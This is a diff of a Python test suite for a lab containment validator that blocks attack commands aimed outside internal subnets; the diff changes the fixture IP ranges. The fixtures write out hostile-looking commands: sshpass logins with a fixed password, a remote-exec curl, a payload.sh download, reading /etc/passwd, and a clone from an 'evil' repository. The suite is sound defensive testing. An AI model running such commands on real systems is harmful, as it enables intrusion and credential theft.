@@ -12,7 +12,7 @@ It intentionally does NOT re-implement the property generators. It asserts, with
 real curated-style commands and hand-written network configs:
 
 - Req. 6.1, 6.2 — ANY command whose destination falls outside the three internal
-  subnets (172.20.0.0/24, 172.21.0.0/24, 172.22.0.0/24) refuses the offending
+  subnets (192.168.10.0/24, 192.168.20.0/24, 192.168.30.0/24) refuses the offending
   Ability and blocks the WHOLE Operation, identifying the Ability/command.
 - Req. 6.3, 6.4 — a target container attached to ``local-network`` (bridge) OR
   configured with an external ``dns`` (e.g. ``8.8.8.8``) is classified NOT
@@ -102,15 +102,15 @@ def _ability(ability_id: str, name: str, *commands: str) -> FakeAbility:
 # --- Curated-style INTERNAL commands (destinations ⊆ 172.20/21/22.0.0/24) ---
 # These mirror the shape of the real curated cases (ShadowRay etc.) but every
 # destination is inside the lab subnets, so containment must ALLOW them.
-CMD_INTERNAL_SSH = "sshpass -p Passw0rd ssh attacker@172.21.0.20 'whoami'"
-CMD_INTERNAL_SSH_OTHER = "sshpass -p Passw0rd ssh attacker@172.20.0.20 'id'"
-CMD_INTERNAL_CURL = "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
-CMD_INTERNAL_WGET = "wget http://172.22.0.10/payload.sh"
+CMD_INTERNAL_SSH = "sshpass -p Passw0rd ssh attacker@192.168.20.30 'whoami'"
+CMD_INTERNAL_SSH_OTHER = "sshpass -p Passw0rd ssh attacker@192.168.10.20 'id'"
+CMD_INTERNAL_CURL = "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec"
+CMD_INTERNAL_WGET = "wget http://192.168.30.30/payload.sh"
 CMD_LOCAL_ONLY = "cat /etc/passwd"
-# Nested double-ssh, BOTH hops internal (172.21.0.20 -> 172.22.0.20): allowed.
+# Nested double-ssh, BOTH hops internal (192.168.20.30 -> 192.168.30.40): allowed.
 CMD_NESTED_DOUBLE_SSH_INTERNAL = (
-    "sshpass -p Passw0rd ssh attacker@172.21.0.20 "
-    "'sshpass -p Passw0rd ssh attacker@172.22.0.20 \"whoami\"'"
+    "sshpass -p Passw0rd ssh attacker@192.168.20.30 "
+    "'sshpass -p Passw0rd ssh attacker@192.168.30.40 \"whoami\"'"
 )
 
 # --- Curated-style EXTERNAL commands (at least one destination outside) -----
@@ -122,7 +122,7 @@ CMD_EXTERNAL_GIT_CLONE = "git clone https://github.com/evil/tool.git"
 CMD_EXTERNAL_PIP = "pip install --index-url https://pypi.org/simple evilpkg"
 # Nested double-ssh where the INNER hop escapes to an external host: refused.
 CMD_NESTED_DOUBLE_SSH_EXTERNAL = (
-    "sshpass -p Passw0rd ssh attacker@172.21.0.20 "
+    "sshpass -p Passw0rd ssh attacker@192.168.20.30 "
     "'sshpass -p Passw0rd ssh attacker@198.51.100.7 \"whoami\"'"
 )
 
@@ -272,15 +272,15 @@ class TestNestedDoubleSshContainment:
     """The nested double-ssh case: both hops internal -> allowed; inner escape -> refused."""
 
     def test_nested_double_ssh_both_internal_is_allowed(self) -> None:
-        """Both hops internal (172.21.0.20 -> 172.22.0.20) is ALLOWED.
+        """Both hops internal (192.168.20.30 -> 192.168.30.40) is ALLOWED.
 
         Validates: Requisitos 6.1, 6.2
         """
         parsed = parse_command(CMD_NESTED_DOUBLE_SSH_INTERNAL)
         detected = {dest.value for dest in parsed.destinations}
         # Both nested hosts are detected by the recursive parser.
-        assert "172.21.0.20" in detected
-        assert "172.22.0.20" in detected
+        assert "192.168.20.30" in detected
+        assert "192.168.30.40" in detected
 
         report = validate_commands(
             [CMD_NESTED_DOUBLE_SSH_INTERNAL],
@@ -296,7 +296,7 @@ class TestNestedDoubleSshContainment:
         """
         parsed = parse_command(CMD_NESTED_DOUBLE_SSH_EXTERNAL)
         detected = {dest.value for dest in parsed.destinations}
-        assert "172.21.0.20" in detected  # outer hop internal
+        assert "192.168.20.30" in detected  # outer hop internal
         assert "198.51.100.7" in detected  # inner hop external
 
         report = validate_commands(
@@ -315,9 +315,9 @@ class TestDestinationClassification:
     @pytest.mark.parametrize(
         "command, value",
         [
-            (CMD_INTERNAL_SSH, "172.21.0.20"),
-            (CMD_INTERNAL_SSH_OTHER, "172.20.0.20"),
-            (CMD_INTERNAL_WGET, "172.22.0.10"),
+            (CMD_INTERNAL_SSH, "192.168.20.30"),
+            (CMD_INTERNAL_SSH_OTHER, "192.168.10.20"),
+            (CMD_INTERNAL_WGET, "192.168.30.30"),
         ],
     )
     def test_internal_destinations_classified_internal(
@@ -383,10 +383,10 @@ class FakeInspector:
 
 # The two genuinely-internal lab networks used by the isolated fixtures.
 _KALI_NGINX_NET = NetworkInfo(
-    name="kali-nginx-network", internal=True, subnets=("172.21.0.0/24",)
+    name="kali-nginx-network", internal=True, subnets=("192.168.20.0/24",)
 )
 _NGINX_DB_NET = NetworkInfo(
-    name="nginx-db-network", internal=True, subnets=("172.22.0.0/24",)
+    name="nginx-db-network", internal=True, subnets=("192.168.30.0/24",)
 )
 
 
